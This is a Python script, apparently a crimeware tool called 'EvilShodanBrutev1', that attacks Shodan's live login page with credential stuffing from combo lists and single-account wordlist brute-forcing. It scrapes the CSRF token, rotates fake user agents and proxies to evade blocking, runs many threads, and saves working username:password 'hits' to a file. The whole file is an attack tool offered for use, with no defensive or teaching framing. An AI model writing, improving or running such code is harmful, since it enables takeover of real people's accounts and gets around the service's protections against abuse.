import requests
from bs4 import BeautifulSoup
import datetime
import os.path
import threading
import easygui
import random
from fake_useragent import UserAgent
ua = UserAgent()
user_agent = ua.random

now = datetime.datetime.now()
date_str = now.strftime('%Y-%m-%d')
good = f'Good_{date_str}.txt'
bad = f'Bad_{date_str}.txt'
session = requests.session()
headers = {
    'User-Agent': user_agent,
    'Pragma': 'no-cache',
    'Accept': '*/*',
}

def banner():
    print("\033[91m" + """
 @@@@@@@@ @@@  @@@ @@@ @@@       @@@@@@  @@@@@@  @@@@@@@   @@@@@@  @@@  @@@ @@@@@@@  @@@@@@@  @@@  @@@ @@@@@@@ @@@@@@@@
 @@!      @@!  @@@ @@! @@!      !@@     @@!  @@@ @@!  @@@ @@!  @@@ @@!@!@@@ @@!  @@@ @@!  @@@ @@!  @@@   @@!   @@!     
 @!!!:!   @!@  !@! !!@ @!!       !@@!!  @!@  !@! @!@  !@! @!@!@!@! @!@@!!@! @!@!@!@  @!@!!@!  @!@  !@!   @!!   @!!!:!  
 !!:       !: .:!  !!: !!:          !:! !!:  !!! !!:  !!! !!:  !!! !!:  !!! !!:  !!! !!: :!!  !!:  !!!   !!:   !!:     
 : :: :::    ::    :   : ::.: : ::.: :   : :. :  :: :  :   :   : : ::    :  :: : ::   :   : :  :.:: :     :    : :: :::
                                                                                                                       V1
                          EvilShodanBrutev1 - XGHOST123 - WOLFSHOP
    """ + "\033[0m")




if os.path.exists("Results") == False:
    os.mkdir("Results")
os.chdir("Results")

def get_proxy():
    proxy_file = easygui.fileopenbox("Select Proxy File")

    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append({'https': line})

    return  proxies
def GenFiles():
    with open(good, 'w') as f:
        pass
    with open(bad, 'w') as a:
        pass



def login(username, password, proxy, proxies):
    try:
        chosen = []
        print("\033[93m[🔍] Attempting login for:\033[0m \033[92m{}\033[0m".format(username))
        
        # Request the login page to obtain CSRF token
        if not proxy:
            csrfparse = session.get("https://account.shodan.io/login", headers=headers, allow_redirects=True)
        else:
            chosen = random.choice(proxies)
            csrfparse = session.get("https://account.shodan.io/login", headers=headers, allow_redirects=True,
                                    proxies=chosen, timeout=1)

        # Check if the request was successful
        if csrfparse.status_code != 200:
            print("\033[91m[❌] Failed to retrieve login page. Status code: {}\033[0m".format(csrfparse.status_code))
            return False

        soup = BeautifulSoup(csrfparse.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf_token'})

        if csrf_input:
            csrf_token = csrf_input['value']
            data = f"username={username}&password={password}&grant_type=password&continue=https%3A%2F%2Faccount.shodan.io%2F&csrf_token={csrf_token}"

            # Perform the login request
            if not proxy:
                loginrequest = session.post("https://account.shodan.io/login", headers=headers, data=data)
            else:
                loginrequest = session.post("https://account.shodan.io/login", headers=headers, data=data,
                                            proxies=chosen, timeout=1)

            if "Invalid username or password" in loginrequest.text:
                print("\033[91m[-] Bad Credentials: \033[0m" + username + ":" + password + " 🚫")
                with open('bad.txt', 'a') as Bad:
                    Bad.write(username + ":" + password + "\n")
            elif "Dashboard" in loginrequest.text:
                print("\033[92m[+] Hit! Credentials Found: \033[0m" + username + ":" + password + " ✅")
                with open('good.txt', 'a') as hits:
                    hits.write(username + ":" + password + "\n")
                return True
            else:
                print("\033[91m[⚠️] Weird Response: Please check the proxy settings!\033[0m")
                if proxy:
                    print("\033[93m[🔄] Trying again with another proxy...\033[0m")
                    login(username, password, proxy, proxies)
        else:
            print("\033[91m[❌] CSRF Token not found. Check the response!\033[0m")
            print("\033[90m[INFO] Response text:\033[0m", csrfparse.text)
    except Exception as e:
        print(f"\033[91m[✖️] An error occurred: {e}\033[0m")

def main():
    banner()
    pr = None
    proxies = []
    print("\033[91m" + "💥💥💥 Welcome to EvilShodanBrutev1 💥💥💥" + "\033[0m")
    print("\n\033[93mChoose an option:\033[0m")
    print("\033[92m1) 🔑 Shodan Mass Bruter Combo Format User:Pass\033[0m")
    print("\033[92m2) 🔐 Brute 1 Account 1 Username\033[0m")
    
    options = int(input("\033[93mChoose An Option:\033[0m "))
    
    if options == 1:
        proxy = input("\033[93mAre you going to use Proxy (Y/N):\033[0m ").upper()
        if proxy == 'Y':
            pr = True
            proxies = get_proxy()
        elif proxy == "N":
            pr = False
        else:
            print("\033[91mInvalid Choice\033[0m")
            return  # Exit the function to avoid further prompts
        
        combo = easygui.fileopenbox("\033[94mCombo File Cred User:Pass:\033[0m")
        Threadsm = int(input("\033[93mHow Many threads do you want:\033[0m "))
        threads = []

        with open(combo, 'r') as com:
            for i in com:
                par = i.rstrip('\n')
                cred = par.split(":")
                user = cred[0]
                password = cred[1]
                thread = threading.Thread(target=login, args=(user, password, pr, proxies))
                threads.append(thread)
                
        print("\033[92m[*] Starting All Threads...\033[0m")
        try:
            for i in range(Threadsm):
                threads[i].start()

            for thread in threads:
                thread.join()
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")

    elif options == 2:
        username = input("\033[93mEnter The Username you Want to attack:\033[0m ")
        wordlist = easygui.fileopenbox("\033[94mSelect your Wordlist for the Attack:\033[0m")
        proxy = input("\033[93mDo you Want to Use Proxy (Y/N):\033[0m ").upper()
        if proxy == 'Y':
            pr = True
            proxies = get_proxy()
        elif proxy == 'N':
            pr = False
        else:
            print("\033[91mInvalid Choice\033[0m")
            return  # Exit the function to avoid further prompts

        with open(wordlist, 'r') as com:
            for i in com:
                password = i.rstrip('\n')
                if login(username, password, pr, proxies):
                    print("\033[92m[+] Congrats! Password Found: {}\033[0m".format(password))
                    break
    else:
        print("\033[91mInvalid Option. Please try again.\033[0m")
        main()  # Restart the main function


main()
